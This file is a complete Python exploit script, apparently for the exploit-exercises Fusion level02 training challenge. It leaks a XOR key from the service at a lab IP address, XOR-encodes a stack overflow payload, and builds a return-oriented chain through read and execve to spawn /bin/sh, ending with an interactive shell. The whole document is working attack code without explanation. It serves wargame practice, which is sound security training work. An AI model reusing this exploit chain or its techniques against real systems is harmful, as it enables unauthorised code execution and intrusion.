# exploit-ex fusion level02
from err0rless import connst
from struct import pack

s, t = connst("192.168.95.152", 20002)

def leak_keybuf():
    s.send("E" + pack("I", 128) + "\x00" * 128)
    s.recv(1024)
    key = s.recv(1024)[-128:]
    
    return key

def cipher(str, key):
    enc = ""
    for i in range(len(str)):
        enc += chr( ord(key[i % 128]) ^ ord(str[i]) )

    return enc

def pMain():
    xorkey = leak_keybuf()

    execp  = "/bin/sh\x00"         # "/bin/sh"
    execp += pack("I", 0x0804B484) # {"/bin/sh", 0}
    execp += pack("I", 0x00000000)

    p  = "A" * (32 * 4096 + 0x10)
    p += pack("I", 0x08048860) # read.plt
    p += pack("I", 0x080499BD) # p-p-p-ret
    p += pack("I", 0x00000000)
    p += pack("I", 0x0804B484) # .bss
    p += pack("I", len(execp))

    p += pack("I", 0x080489B0) # execve.plt
    p += pack("I", 0x44444444)
    p += pack("I", 0x0804B484)
    p += pack("I", 0x0804B48C)
    p += pack("I", 0x00000000)
    # execve("/bin/sh", {"/bin/sh", 0}, 0);

    s.send("E" + pack("I", len(p)) + cipher(p, xorkey) + "Q")
    print t.read_until("\x8C\xB4\x04\x08")

    s.send(execp)
    t.interact()

if __name__ == "__main__":
    pMain()